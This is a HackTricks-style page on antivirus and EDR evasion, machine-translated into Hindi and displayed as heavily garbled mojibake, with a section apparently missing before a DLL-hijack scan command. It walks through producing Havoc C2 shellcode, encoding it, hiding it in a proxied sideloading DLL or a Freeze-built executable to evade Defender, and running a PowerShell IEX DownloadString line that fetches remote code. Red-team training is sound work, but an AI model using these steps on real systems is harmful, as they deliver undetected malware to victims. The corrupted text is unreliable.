# рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ (AV) рдмрд╛рдпрдкрд╛рд╕

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореЗрд░рд╛** рдЯреНрд╡рд┐рдЯрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

**рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдерд╛** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **AV рдИрд╡реЗрд╢рди рдореЗрдердбреЛрд▓реЙрдЬреА**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ, AVs рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреЛ рджреБрд╖реНрдЯ рдпрд╛ рдирд╣реАрдВ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди, рдЧрддрд┐рд╢реАрд▓ рд╡рд┐рд╢реНрд▓реЗрд╖рдг, рдФрд░ рдЙрдиреНрдирдд EDRs рдХреЗ рд▓рд┐рдП рд╡реНрдпрд╡рд╣рд╛рд░рд╛рддреНрдордХ рд╡рд┐рд╢реНрд▓реЗрд╖рдгред

### **рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди**

рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди рдХреЛ рдПрдХ рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдЬреНрдЮрд╛рдд рджреБрд╖реНрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдЭрдВрдЭрдЯрд┐рдд рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рднреА рдлрд╝рд╛рдЗрд▓ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛рддреА рд╣реИ (рдЬреИрд╕реЗ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд╡рд░рдг, рдХрдВрдкрдиреА рдХрд╛ рдирд╛рдо, рдбрд┐рдЬрд┐рдЯрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░, рдЖрдЗрдХрди, рдЪреЗрдХрд╕рдо, рдЖрджрд┐)ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЬреНрдЮрд╛рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЙрдиреНрд╣реЛрдВрдиреЗ рд╕рдВрд╢реЛрдзрд┐рдд рдФрд░ рджреБрд╖реНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЭрдВрдЭрдЯрд┐рдд рдХрд┐рдпрд╛ рд╣реЛрдЧрд╛ред рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдкрд╣рдЪрд╛рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

* **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди**

рдпрджрд┐ рдЖрдк рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ AV рдХреЛ рдЖрдкрдХреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХрд╛ рд▓реЛрдбрд░ рдЪрд╛рд╣рд┐рдП рд╣реЛрдЧрд╛ рдЬреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдореЗрдореЛрд░реА рдореЗрдВ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред

* **рдЕрд╡рдлрд╕реНрдХреЗрд╢рди**

рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдЕрд╡рдлрд╕реНрдХреЗрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдХреБрдЫ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХрд┐рд╕реА рднреА рдЪреАрдЬ рдХреЛ рдЕрд╡рдлрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

* **рдХрд╕реНрдЯрдо рдЯреВрд▓рд┐рдВрдЧ**

рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдЙрдкрдХрд░рдг рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЛрдИ рдЬрд╛рдиреЗ рдорд╛рдиреЗ рдмреБрд░реЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдирд╣реАрдВ рд╣реЛрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдЗрд╕рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рдФрд░ рдкреНрд░рдпрд╛рд╕ рд▓рдЧреЗрдЧрд╛ред

{% hint style="info" %}
Windows Defender рд╕реНрдереИрддрд┐рдХ рдкрд╣рдЪрд╛рди рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдБрдЪ рдХреЗ рд▓рд┐рдП [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред рдпрд╣ рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЛ рдХрдИ рд╕реЗрдЧрдореЗрдВрдЯ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ Defender рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣, рдпрд╣ рдЖрдкрдХреЛ рдмрддрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдЭрдВрдЭрдЯрд┐рдд рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рдпрд╛ рдмрд╛рдЗрдЯреНрд╕ рдХреНрдпрд╛ рд╣реИрдВред
{% endhint %}

рдореИрдВ рдЖрдкрдХреЛ рдЗрд╕ [YouTube рдкреНрд▓реЗрд▓рд┐рд╕реНрдЯ](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрддреНрдпрдзрд┐рдХ рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░рддрд╛ рд╣реВрдБ рдЬреЛ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ AV рдИрд╡реЗрд╢рди рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

рдпрд╣ рдХрдорд╛рдВрдб "C:\Program Files\\" рдХреЗ рдЕрдВрджрд░ DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреА рд╕реВрдЪреА рдФрд░ рд╡реЗ DLL рдлрд╝рд╛рдЗрд▓реЗрдВ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдЬрд┐рдиреНрд╣реЗрдВ рд╡реЗ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВред

рдореИрдВ рдЖрдкрдХреЛ **DLL Hijackable/Sideloadable programs** рдЦреБрдж рдЦреЛрдЬрдиреЗ рдХреА рдЕрдзрд┐рдХ рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБ, рдпрд╣ рддрдХрдиреАрдХ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЬрд╛рдиреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ DLL Sideloadable рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЖрд╕рд╛рдиреА рд╕реЗ рдкрдХрдбрд╝реЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдХрд┐рд╕реА рднреА рджреБрд░реБрдкрдпреЛрдЧреА DLL рдХреЛ рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдЙрдореНрдореАрдж рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдирд╛рдордХ DLL рдХреЗ рд╕рд╛рде рд░рдЦрдиреЗ рд╕реЗ рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд▓реЛрдб рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдХрд╛рд░реНрдпрдХреНрд░рдо рдЙрд╕ DLL рдХреЗ рдЕрдВрджрд░ рдХреБрдЫ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпреЛрдВ рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдо рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬрд┐рд╕реЗ **DLL Proxying/Forwarding** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

**DLL Proxying** рдХрд╛рд░реНрдпрдХреНрд░рдо рджреНрд╡рд╛рд░рд╛ рдХрд┐рдП рдЧрдП рдХреЙрд▓реНрд╕ рдХреЛ рдкреНрд░реЙрдХреНрд╕реА (рдФрд░ рджреБрд░реБрдкрдпреЛрдЧреА) DLL рд╕реЗ рдореВрд▓ DLL рддрдХ рдлреЙрд░рд╡рд░реНрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред

рдореИрдВ [@flangvik](https://twitter.com/Flangvik/) рдХреЗ [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) рдкрд░рд┐рдпреЛрдЬрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реВрдВрдЧрд╛ред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдореИрдВрдиреЗ рдЕрдкрдирд╛рдП:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

рдЖрдЦрд┐рд░реА рдХрдорд╛рдВрдб рд╣рдореЗрдВ 2 рдлрд╝рд╛рдЗрд▓реЗрдВ рджреЗрдЧреА: рдПрдХ DLL рд╕реНрд░реЛрдд рдХреЛрдб рдЯреЗрдореНрдкрд▓реЗрдЯ, рдФрд░ рдореВрд▓ рдирд╛рдо рдмрджрд▓ рджреА рдЧрдИ DLLред

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

рдпреЗ рд╣реИрдВ рдкрд░рд┐рдгрд╛рдо:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

рд╣рдорд╛рд░реЗ рд╢реЗрд▓рдХреЛрдб (рдЬрд┐рд╕реЗ [SGN](https://github.com/EgeBalci/sgn) рдХреЗ рд╕рд╛рде рдПрдиреНрдХреЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ) рдФрд░ рдкреНрд░реЙрдХреНрд╕реА DLL рджреЛрдиреЛрдВ рдХрд╛ [antiscan.me](https://antiscan.me) рдореЗрдВ 0/26 рдбрд┐рдЯреЗрдХреНрд╢рди рджрд░ рд╣реИ! рдореИрдВ рдЗрд╕реЗ рдПрдХ рд╕рдлрд▓рддрд╛ рдХрд╣реВрдВрдЧрд╛ред

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдореИрдВ **рдКрдЪрд╛ рд╕рд┐рдлрд╛рд░рд┐рд╢** рдХрд░рддрд╛ рд╣реВрдВ рдХрд┐ рдЖрдк [S3cur3Th1sSh1t рдХреЗ twitch VOD](https://www.twitch.tv/videos/1644171543) рдХреЛ DLL Sideloading рдФрд░ [ippsec рдХреЗ рд╡реАрдбрд┐рдпреЛ](https://www.youtube.com/watch?v=3eROsG\_WNpE) рдХреЛ рджреЗрдЦреЗрдВ рдФрд░ рд╣рдордиреЗ рдЬреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рдЪрд░реНрдЪрд╛ рдХреА рд╣реИ, рдЙрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze рдПрдХ рдкреЗрдбрд▓реЛрдб рдЯреВрд▓рдХрд┐рдЯ рд╣реИ рдЬреЛ EDRs рдХреЛ рд╕рд╕реНрдкреЗрдВрдбреЗрдб рдкреНрд░реЛрд╕реЗрд╕реЗрд╕, рдбрд╛рдпрд░реЗрдХреНрдЯ рд╕рд┐рд╕рдХреЙрд▓реНрд╕, рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ`

рдЖрдк Freeze рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╢реЗрд▓рдХреЛрдб рдХреЛ рдПрдХ рдЫрд▓рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рддрд░реАрдХреЗ рдореЗрдВ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдЯрд╛рд▓рдирд╛ рдмрд╕ рдПрдХ рдмрд┐рд▓реНрд▓реА рдФрд░ рдЪреВрд╣реЗ рдХрд╛ рдЦреЗрд▓ рд╣реИ, рдЬреЛ рдЖрдЬ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдХрд▓ рдкрдХрдбрд╝ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХрднреА рднреА рдХреЗрд╡рд▓ рдПрдХ рдЙрдкрдХрд░рдг рдкрд░ рднрд░реЛрд╕рд╛ рди рдХрд░реЗрдВ, рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдХрдИ рдЯрд╛рд▓рдиреЗ рдХреА рддрдХрдиреАрдХреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
{% endhint %}

## AMSI (рдПрдВрдЯреА-рдореИрд▓рд╡реЗрдпрд░ рд╕реНрдХреИрди рдЗрдВрдЯрд░рдлреЗрд╕)

AMSI рдХреЛ "[рдлрд╛рдЗрд▓рд▓реЗрд╕ рдореИрд▓рд╡реЗрдпрд░](https://en.wikipedia.org/wiki/Fileless\_malware)" рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдкрд╣рд▓реЗ, AVs рдХреЗрд╡рд▓ **рдбрд┐рд╕реНрдХ рдкрд░ рдлрд╝рд╛рдЗрд▓реЗрдВ** рд╕реНрдХреИрди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рд╕реЗ payloads **рд╕реАрдзреЗ рдореЗрдореЛрд░реА рдореЗрдВ** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рдереЗ, рддреЛ AV рдХреБрдЫ рднреА рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рдерд╛ рдЗрд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ рдкрд░реНрдпрд╛рдкреНрдд рджреГрд╢реНрдпрддрд╛ рдирд╣реАрдВ рдереАред

AMSI рд╕реБрд╡рд┐рдзрд╛ рд╡рд┐рдВрдбреЛрдЬ рдХреЗ рдЗрди рдШрдЯрдХреЛрдВ рдореЗрдВ рдПрдХреАрдХреГрдд рд╣реИред

* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдирд┐рдпрдВрддреНрд░рдг, рдпрд╛ UAC (EXE, COM, MSI, рдпрд╛ ActiveX рд╕реНрдерд╛рдкрдирд╛ рдХрд╛ рдЙрдиреНрдирдпрди)
* рдкрд╛рд╡рд░рд╢реЗрд▓ (рд╕реНрдХреНрд░рд┐рдкреНрдЯ, рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рдЙрдкрдпреЛрдЧ, рдФрд░ рдЧрддрд┐рд╢реАрд▓ рдХреЛрдб рдореВрд▓реНрдпрд╛рдВрдХрди)
* рд╡рд┐рдВрдбреЛрдЬ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реЛрд╕реНрдЯ (wscript.exe рдФрд░ cscript.exe)
* рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рд╡реАрдмреАрд╕реНрдХреНрд░рд┐рдкреНрдЯ
* рдСрдлрд┐рд╕ VBA рдореИрдХреНрд░реЛ

рдпрд╣ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдПрдХ рдРрд╕реЗ рд░реВрдк рдореЗрдВ рдЙрдирдХреЛ рдЕрдирдХреНрд░рд┐рдкреНрдЯ рдФрд░ рдЕрд╡рд┐рд▓рдХреНрд╖рд┐рдд рд░реВрдк рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` рдЪрд▓рд╛рдиреЗ рдкрд░ рд╡рд┐рдВрдбреЛрдЬ рдбрд┐рдлреЗрдВрдбрд░ рдкрд░ рдирд┐рдореНрди рдЪреЗрддрд╛рд╡рдиреА рджреА рдЬрд╛рдПрдЧреАред

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ `amsi:` рдХреЛ рдкрд╣рд▓реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХрд╛ рдкрде, рдЬрд┐рд╕рд╕реЗ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛рдпрд╛ рдЧрдпрд╛, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, powershell.exe

рд╣рдордиреЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдбрд┐рд╕реНрдХ рдкрд░ рдирд╣реАрдВ рдЫреЛрдбрд╝рд╛, рд▓реЗрдХрд┐рди рдлрд┐рд░ рднреА AMSI рдХреЗ рдХрд╛рд░рдг рдореЗрдореЛрд░реА рдореЗрдВ рдкрдХрдбрд╝ рдЧрдПред

AMSI рдХреЛ рдЪрдХреНрдХрд░ рдореЗрдВ рд▓реЗрдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рд╣реИрдВ:

* **рдЕрд╡рдЧреБрдгрди**

рдХреНрдпреЛрдВрдХрд┐ AMSI рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕реНрдереИрддрд┐рдХ рдкрдХрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЧрдИ рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдбрд┐рдЯреЗрдХреНрд╢рди рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдПред

рд╣рд╛рд▓рд╛рдВрдХрд┐, AMSI рдХреЗ рдкрд╛рд╕ рдпрджрд┐ рдпрд╣ рдХрдИ рд▓реЗрдпрд░реНрд╕ рд╣реЛ рддреЛ рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯреЛрдВ рдХреЛ рдЕрдирдСрдмреНрд╕реНрдХреЗрдЯ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИ, рддреЛ рдЕрд╡рдЧреБрдгрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕ рдкрд░ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЗрд╕реЗ рдЯрд╛рд▓рдирд╛ рдЗрддрдирд╛ рд╕реАрдзрд╛ рдирд╣реАрдВ рдмрдирд╛рддрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХрднреА-рдХрднреА, рдЖрдкрдХреЛ рдХреБрдЫ рдЪрд░рдгреЛрдВ рдХреЗ рдирд╛рдо рдмрджрд▓рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдЖрдк рдЕрдЪреНрдЫреЗ рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЙрд╕ рдкрд░ рдХрд┐рддрдирд╛ рдЭрдВрдбрд╛ рд▓рдЧрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

* **AMSI рдмрд╛рдИрдкрд╛рд╕**

